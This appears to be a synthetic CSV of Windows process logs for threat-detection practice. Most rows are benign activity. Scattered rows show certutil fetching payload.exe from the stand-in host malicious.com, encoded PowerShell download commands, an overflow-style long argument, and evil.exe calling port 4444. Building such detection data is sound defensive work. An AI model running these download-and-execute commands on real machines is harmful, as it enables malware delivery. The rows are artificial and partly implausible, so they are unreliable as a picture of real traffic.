timestamp,process,parent_process,command_line,ip,destination_port,user_agent
2026-03-30 18:21:09,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,1.1.1.1,80,python-requests
2026-03-30 18:21:10,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,80,winhttp
2026-03-30 18:21:11,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,8.8.8.8,80,winhttp
2026-03-30 18:21:12,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,80,winhttp
2026-03-30 18:21:13,chrome.exe,explorer.exe,cmd dir,192.168.1.234,0,chrome
2026-03-30 18:21:14,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.94,0,chrome
2026-03-30 18:21:15,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.212,0,chrome
2026-03-30 18:21:16,cmd.exe,explorer.exe,cmd dir,192.168.1.191,0,chrome
2026-03-30 18:21:17,cmd.exe,explorer.exe,cmd dir,192.168.1.156,0,chrome
2026-03-30 18:21:18,notepad.exe,explorer.exe,cmd dir,192.168.1.90,0,chrome
2026-03-30 18:21:19,cmd.exe,explorer.exe,cmd dir,192.168.1.112,0,chrome
2026-03-30 18:21:20,explorer.exe,explorer.exe,explorer open folder,192.168.1.149,0,chrome
2026-03-30 18:21:21,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.198,0,chrome
2026-03-30 18:21:22,notepad.exe,explorer.exe,notepad file.txt,192.168.1.142,0,chrome
2026-03-30 18:21:23,explorer.exe,explorer.exe,notepad file.txt,192.168.1.16,0,chrome
2026-03-30 18:21:24,explorer.exe,explorer.exe,cmd dir,192.168.1.25,0,chrome
2026-03-30 18:21:25,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.251,0,chrome
2026-03-30 18:21:26,cmd.exe,explorer.exe,notepad file.txt,192.168.1.131,0,chrome
2026-03-30 18:21:27,cmd.exe,explorer.exe,cmd dir,192.168.1.79,0,chrome
2026-03-30 18:21:28,cmd.exe,explorer.exe,cmd dir,192.168.1.176,0,chrome
2026-03-30 18:21:29,chrome.exe,explorer.exe,notepad file.txt,192.168.1.154,0,chrome
2026-03-30 18:21:30,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.35,0,chrome
2026-03-30 18:21:31,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.158,0,chrome
2026-03-30 18:21:32,cmd.exe,explorer.exe,explorer open folder,192.168.1.205,0,chrome
2026-03-30 18:21:33,explorer.exe,explorer.exe,cmd dir,192.168.1.99,0,chrome
2026-03-30 18:21:34,notepad.exe,explorer.exe,notepad file.txt,192.168.1.149,0,chrome
2026-03-30 18:21:35,cmd.exe,explorer.exe,cmd dir,192.168.1.165,0,chrome
2026-03-30 18:21:36,notepad.exe,explorer.exe,explorer open folder,192.168.1.153,0,chrome
2026-03-30 18:21:37,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.219,0,chrome
2026-03-30 18:21:38,notepad.exe,explorer.exe,explorer open folder,192.168.1.145,0,chrome
2026-03-30 18:21:39,cmd.exe,explorer.exe,notepad file.txt,192.168.1.226,0,chrome
2026-03-30 18:21:40,cmd.exe,explorer.exe,explorer open folder,192.168.1.67,0,chrome
2026-03-30 18:21:41,explorer.exe,explorer.exe,notepad file.txt,192.168.1.218,0,chrome
2026-03-30 18:21:42,cmd.exe,explorer.exe,notepad file.txt,192.168.1.225,0,chrome
2026-03-30 18:21:43,explorer.exe,explorer.exe,cmd dir,192.168.1.168,0,chrome
2026-03-30 18:21:44,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.130,0,chrome
2026-03-30 18:21:45,weird.exe,cmd.exe,weird.exe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,23.45.67.89,8080,curl
2026-03-30 18:21:46,chrome.exe,explorer.exe,notepad file.txt,192.168.1.230,0,chrome
2026-03-30 18:21:47,notepad.exe,explorer.exe,notepad file.txt,192.168.1.167,0,chrome
2026-03-30 18:21:48,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.43,0,chrome
2026-03-30 18:21:49,notepad.exe,explorer.exe,cmd dir,192.168.1.211,0,chrome
2026-03-30 18:21:50,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.185,0,chrome
2026-03-30 18:21:51,notepad.exe,explorer.exe,notepad file.txt,192.168.1.230,0,chrome
2026-03-30 18:21:52,explorer.exe,explorer.exe,notepad file.txt,192.168.1.138,0,chrome
2026-03-30 18:21:53,chrome.exe,explorer.exe,explorer open folder,192.168.1.214,0,chrome
2026-03-30 18:21:54,explorer.exe,explorer.exe,cmd dir,192.168.1.173,0,chrome
2026-03-30 18:21:55,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.17,0,chrome
2026-03-30 18:21:56,notepad.exe,explorer.exe,explorer open folder,192.168.1.57,0,chrome
2026-03-30 18:21:57,explorer.exe,explorer.exe,notepad file.txt,192.168.1.40,0,chrome
2026-03-30 18:21:58,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.107,0,chrome
2026-03-30 18:21:59,notepad.exe,explorer.exe,cmd dir,192.168.1.80,0,chrome
2026-03-30 18:22:00,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.214,0,chrome
2026-03-30 18:22:01,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.49,0,chrome
2026-03-30 18:22:02,explorer.exe,explorer.exe,cmd dir,192.168.1.181,0,chrome
2026-03-30 18:22:03,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.11,0,chrome
2026-03-30 18:22:04,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.231,0,chrome
2026-03-30 18:22:05,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.67,0,chrome
2026-03-30 18:22:06,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.118,0,chrome
2026-03-30 18:22:07,chrome.exe,explorer.exe,cmd dir,192.168.1.229,0,chrome
2026-03-30 18:22:08,cmd.exe,explorer.exe,explorer open folder,192.168.1.103,0,chrome
2026-03-30 18:22:09,cmd.exe,explorer.exe,cmd dir,192.168.1.143,0,chrome
2026-03-30 18:22:10,notepad.exe,explorer.exe,cmd dir,192.168.1.88,0,chrome
2026-03-30 18:22:11,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.167,0,chrome
2026-03-30 18:22:12,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.79,0,chrome
2026-03-30 18:22:13,explorer.exe,explorer.exe,explorer open folder,192.168.1.220,0,chrome
2026-03-30 18:22:14,notepad.exe,explorer.exe,cmd dir,192.168.1.23,0,chrome
2026-03-30 18:22:15,chrome.exe,explorer.exe,explorer open folder,192.168.1.212,0,chrome
2026-03-30 18:22:16,chrome.exe,explorer.exe,explorer open folder,192.168.1.45,0,chrome
2026-03-30 18:22:17,chrome.exe,explorer.exe,notepad file.txt,192.168.1.176,0,chrome
2026-03-30 18:22:18,chrome.exe,explorer.exe,explorer open folder,192.168.1.37,0,chrome
2026-03-30 18:22:19,explorer.exe,explorer.exe,explorer open folder,192.168.1.209,0,chrome
2026-03-30 18:22:20,notepad.exe,explorer.exe,cmd dir,192.168.1.46,0,chrome
2026-03-30 18:22:21,notepad.exe,explorer.exe,explorer open folder,192.168.1.28,0,chrome
2026-03-30 18:22:22,notepad.exe,explorer.exe,explorer open folder,192.168.1.9,0,chrome
2026-03-30 18:22:23,chrome.exe,explorer.exe,cmd dir,192.168.1.176,0,chrome
2026-03-30 18:22:24,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.180,0,chrome
2026-03-30 18:22:25,cmd.exe,explorer.exe,explorer open folder,192.168.1.125,0,chrome
2026-03-30 18:22:26,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.185,0,chrome
2026-03-30 18:22:27,chrome.exe,explorer.exe,notepad file.txt,192.168.1.226,0,chrome
2026-03-30 18:22:28,notepad.exe,explorer.exe,notepad file.txt,192.168.1.14,0,chrome
2026-03-30 18:22:29,explorer.exe,explorer.exe,explorer open folder,192.168.1.225,0,chrome
2026-03-30 18:22:30,chrome.exe,explorer.exe,notepad file.txt,192.168.1.164,0,chrome
2026-03-30 18:22:31,notepad.exe,explorer.exe,explorer open folder,192.168.1.20,0,chrome
2026-03-30 18:22:32,chrome.exe,explorer.exe,cmd dir,192.168.1.39,0,chrome
2026-03-30 18:22:33,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.144,0,chrome
2026-03-30 18:22:34,explorer.exe,explorer.exe,notepad file.txt,192.168.1.208,0,chrome
2026-03-30 18:22:35,cmd.exe,explorer.exe,notepad file.txt,192.168.1.7,0,chrome
2026-03-30 18:22:36,chrome.exe,explorer.exe,cmd dir,192.168.1.75,0,chrome
2026-03-30 18:22:37,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.143,0,chrome
2026-03-30 18:22:38,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.231,0,chrome
2026-03-30 18:22:39,chrome.exe,explorer.exe,notepad file.txt,192.168.1.28,0,chrome
2026-03-30 18:22:40,notepad.exe,explorer.exe,cmd dir,192.168.1.93,0,chrome
2026-03-30 18:22:41,explorer.exe,explorer.exe,explorer open folder,192.168.1.245,0,chrome
2026-03-30 18:22:42,cmd.exe,explorer.exe,explorer open folder,192.168.1.47,0,chrome
2026-03-30 18:22:43,notepad.exe,explorer.exe,notepad file.txt,192.168.1.119,0,chrome
2026-03-30 18:22:44,cmd.exe,explorer.exe,notepad file.txt,192.168.1.157,0,chrome
2026-03-30 18:22:45,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,23.45.67.89,443,python-requests
2026-03-30 18:22:46,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,8.8.8.8,443,curl
2026-03-30 18:22:47,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,1.1.1.1,80,python-requests
2026-03-30 18:22:48,powershell.exe,winword.exe,powershell -enc aW52b2tl,45.33.32.156,443,curl
2026-03-30 18:22:49,powershell.exe,winword.exe,powershell -enc aW52b2tl,1.1.1.1,80,python-requests
2026-03-30 18:22:50,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,80,winhttp
2026-03-30 18:22:51,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,8.8.8.8,80,winhttp
2026-03-30 18:22:52,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,80,winhttp
2026-03-30 18:22:53,cmd.exe,explorer.exe,cmd dir,192.168.1.214,0,chrome
2026-03-30 18:22:54,chrome.exe,explorer.exe,explorer open folder,192.168.1.66,0,chrome
2026-03-30 18:22:55,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.91,0,chrome
2026-03-30 18:22:56,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.147,0,chrome
2026-03-30 18:22:57,cmd.exe,explorer.exe,cmd dir,192.168.1.253,0,chrome
2026-03-30 18:22:58,explorer.exe,explorer.exe,explorer open folder,192.168.1.85,0,chrome
2026-03-30 18:22:59,cmd.exe,explorer.exe,cmd dir,192.168.1.35,0,chrome
2026-03-30 18:23:00,explorer.exe,explorer.exe,notepad file.txt,192.168.1.89,0,chrome
2026-03-30 18:23:01,chrome.exe,explorer.exe,notepad file.txt,192.168.1.118,0,chrome
2026-03-30 18:23:02,explorer.exe,explorer.exe,notepad file.txt,192.168.1.44,0,chrome
2026-03-30 18:23:03,chrome.exe,explorer.exe,cmd dir,192.168.1.46,0,chrome
2026-03-30 18:23:04,notepad.exe,explorer.exe,cmd dir,192.168.1.237,0,chrome
2026-03-30 18:23:05,chrome.exe,explorer.exe,notepad file.txt,192.168.1.171,0,chrome
2026-03-30 18:23:06,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.236,0,chrome
2026-03-30 18:23:07,cmd.exe,explorer.exe,notepad file.txt,192.168.1.237,0,chrome
2026-03-30 18:23:08,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.96,0,chrome
2026-03-30 18:23:09,cmd.exe,explorer.exe,explorer open folder,192.168.1.124,0,chrome
2026-03-30 18:23:10,cmd.exe,explorer.exe,explorer open folder,192.168.1.66,0,chrome
2026-03-30 18:23:11,explorer.exe,explorer.exe,cmd dir,192.168.1.6,0,chrome
2026-03-30 18:23:12,notepad.exe,explorer.exe,notepad file.txt,192.168.1.239,0,chrome
2026-03-30 18:23:13,explorer.exe,explorer.exe,notepad file.txt,192.168.1.57,0,chrome
2026-03-30 18:23:14,cmd.exe,explorer.exe,notepad file.txt,192.168.1.155,0,chrome
2026-03-30 18:23:15,chrome.exe,explorer.exe,notepad file.txt,192.168.1.119,0,chrome
2026-03-30 18:23:16,explorer.exe,explorer.exe,explorer open folder,192.168.1.160,0,chrome
2026-03-30 18:23:17,explorer.exe,explorer.exe,notepad file.txt,192.168.1.53,0,chrome
2026-03-30 18:23:18,cmd.exe,explorer.exe,notepad file.txt,192.168.1.197,0,chrome
2026-03-30 18:23:19,notepad.exe,explorer.exe,notepad file.txt,192.168.1.142,0,chrome
2026-03-30 18:23:20,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.226,0,chrome
2026-03-30 18:23:21,explorer.exe,explorer.exe,notepad file.txt,192.168.1.156,0,chrome
2026-03-30 18:23:22,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.25,0,chrome
2026-03-30 18:23:23,explorer.exe,explorer.exe,cmd dir,192.168.1.248,0,chrome
2026-03-30 18:23:24,cmd.exe,explorer.exe,notepad file.txt,192.168.1.250,0,chrome
2026-03-30 18:23:25,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.51,0,chrome
2026-03-30 18:23:26,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.82,0,chrome
2026-03-30 18:23:27,explorer.exe,explorer.exe,cmd dir,192.168.1.90,0,chrome
2026-03-30 18:23:28,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.166,0,chrome
2026-03-30 18:23:29,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.27,0,chrome
2026-03-30 18:23:30,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.164,0,chrome
2026-03-30 18:23:31,chrome.exe,explorer.exe,cmd dir,192.168.1.199,0,chrome
2026-03-30 18:23:32,notepad.exe,explorer.exe,explorer open folder,192.168.1.172,0,chrome
2026-03-30 18:23:33,cmd.exe,explorer.exe,explorer open folder,192.168.1.241,0,chrome
2026-03-30 18:23:34,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.216,0,chrome
2026-03-30 18:23:35,notepad.exe,explorer.exe,explorer open folder,192.168.1.98,0,chrome
2026-03-30 18:23:36,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.183,0,chrome
2026-03-30 18:23:37,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.3,0,chrome
2026-03-30 18:23:38,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.224,0,chrome
2026-03-30 18:23:39,notepad.exe,explorer.exe,explorer open folder,192.168.1.130,0,chrome
2026-03-30 18:23:40,explorer.exe,explorer.exe,notepad file.txt,192.168.1.123,0,chrome
2026-03-30 18:23:41,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.70,0,chrome
2026-03-30 18:23:42,notepad.exe,explorer.exe,cmd dir,192.168.1.242,0,chrome
2026-03-30 18:23:43,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.175,0,chrome
2026-03-30 18:23:44,notepad.exe,explorer.exe,cmd dir,192.168.1.174,0,chrome
2026-03-30 18:23:45,weird.exe,cmd.exe,weird.exe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,1.1.1.1,8080,curl
2026-03-30 18:23:46,cmd.exe,explorer.exe,cmd dir,192.168.1.86,0,chrome
2026-03-30 18:23:47,explorer.exe,explorer.exe,explorer open folder,192.168.1.165,0,chrome
2026-03-30 18:23:48,chrome.exe,explorer.exe,cmd dir,192.168.1.71,0,chrome
2026-03-30 18:23:49,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.220,0,chrome
2026-03-30 18:23:50,notepad.exe,explorer.exe,notepad file.txt,192.168.1.161,0,chrome
2026-03-30 18:23:51,explorer.exe,explorer.exe,cmd dir,192.168.1.99,0,chrome
2026-03-30 18:23:52,explorer.exe,explorer.exe,cmd dir,192.168.1.61,0,chrome
2026-03-30 18:23:53,chrome.exe,explorer.exe,explorer open folder,192.168.1.120,0,chrome
2026-03-30 18:23:54,explorer.exe,explorer.exe,cmd dir,192.168.1.182,0,chrome
2026-03-30 18:23:55,chrome.exe,explorer.exe,cmd dir,192.168.1.69,0,chrome
2026-03-30 18:23:56,explorer.exe,explorer.exe,cmd dir,192.168.1.250,0,chrome
2026-03-30 18:23:57,explorer.exe,explorer.exe,cmd dir,192.168.1.226,0,chrome
2026-03-30 18:23:58,notepad.exe,explorer.exe,notepad file.txt,192.168.1.186,0,chrome
2026-03-30 18:23:59,explorer.exe,explorer.exe,notepad file.txt,192.168.1.42,0,chrome
2026-03-30 18:24:00,chrome.exe,explorer.exe,notepad file.txt,192.168.1.211,0,chrome
2026-03-30 18:24:01,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.144,0,chrome
2026-03-30 18:24:02,notepad.exe,explorer.exe,notepad file.txt,192.168.1.116,0,chrome
2026-03-30 18:24:03,notepad.exe,explorer.exe,cmd dir,192.168.1.65,0,chrome
2026-03-30 18:24:04,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.2,0,chrome
2026-03-30 18:24:05,cmd.exe,explorer.exe,explorer open folder,192.168.1.188,0,chrome
2026-03-30 18:24:06,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.86,0,chrome
2026-03-30 18:24:07,explorer.exe,explorer.exe,explorer open folder,192.168.1.30,0,chrome
2026-03-30 18:24:08,cmd.exe,explorer.exe,explorer open folder,192.168.1.195,0,chrome
2026-03-30 18:24:09,explorer.exe,explorer.exe,explorer open folder,192.168.1.107,0,chrome
2026-03-30 18:24:10,explorer.exe,explorer.exe,cmd dir,192.168.1.209,0,chrome
2026-03-30 18:24:11,notepad.exe,explorer.exe,cmd dir,192.168.1.201,0,chrome
2026-03-30 18:24:12,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.73,0,chrome
2026-03-30 18:24:13,notepad.exe,explorer.exe,cmd dir,192.168.1.123,0,chrome
2026-03-30 18:24:14,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.91,0,chrome
2026-03-30 18:24:15,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.220,0,chrome
2026-03-30 18:24:16,explorer.exe,explorer.exe,notepad file.txt,192.168.1.104,0,chrome
2026-03-30 18:24:17,chrome.exe,explorer.exe,explorer open folder,192.168.1.162,0,chrome
2026-03-30 18:24:18,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.78,0,chrome
2026-03-30 18:24:19,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.68,0,chrome
2026-03-30 18:24:20,cmd.exe,explorer.exe,notepad file.txt,192.168.1.227,0,chrome
2026-03-30 18:24:21,explorer.exe,explorer.exe,cmd dir,192.168.1.184,0,chrome
2026-03-30 18:24:22,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.122,0,chrome
2026-03-30 18:24:23,explorer.exe,explorer.exe,notepad file.txt,192.168.1.75,0,chrome
2026-03-30 18:24:24,notepad.exe,explorer.exe,notepad file.txt,192.168.1.22,0,chrome
2026-03-30 13:00:00,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.5,0,chrome
2026-03-30 13:00:10,explorer.exe,system,open folder documents,192.168.1.5,0,none
2026-03-30 13:00:20,notepad.exe,explorer.exe,notepad file.txt,192.168.1.5,0,none
2026-03-30 13:00:30,powershell.exe,winword.exe,powershell -enc aW52b2tlLXdlYnJlcXVlc3Q=,8.8.8.8,443,python-requests
2026-03-30 13:00:40,weird.exe,cmd.exe,weird.exe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,45.33.32.156,8080,curl
2026-03-30 13:00:50,evil.exe,powershell.exe,C:\Users\Public\evil.exe,23.45.67.89,4444,unknown
2026-03-30 14:00:00,chrome.exe,explorer.exe,chrome browsing youtube.com,192.168.1.10,0,chrome
2026-03-30 14:00:10,chrome.exe,explorer.exe,chrome browsing gmail.com,192.168.1.11,0,chrome
2026-03-30 14:00:20,cmd.exe,explorer.exe,cmd dir,192.168.1.12,0,none
2026-03-30 14:00:30,unknown_123.exe,explorer.exe,run random tool,34.120.55.1,443,unknown
2026-03-30 14:00:40,weird.exe,cmd.exe,weird.exe BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB,18.22.33.44,8080,curl
2026-03-30 15:00:00,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.5,0,chrome
2026-03-30 15:00:10,chrome.exe,explorer.exe,chrome browsing linkedin.com,192.168.1.6,0,chrome
2026-03-30 15:00:20,notepad.exe,explorer.exe,notepad file.txt,192.168.1.7,0,none
2026-03-30 15:00:30,explorer.exe,system,open folder downloads,192.168.1.8,0,none
2026-03-30 15:00:40,cmd.exe,explorer.exe,cmd dir,192.168.1.9,0,none
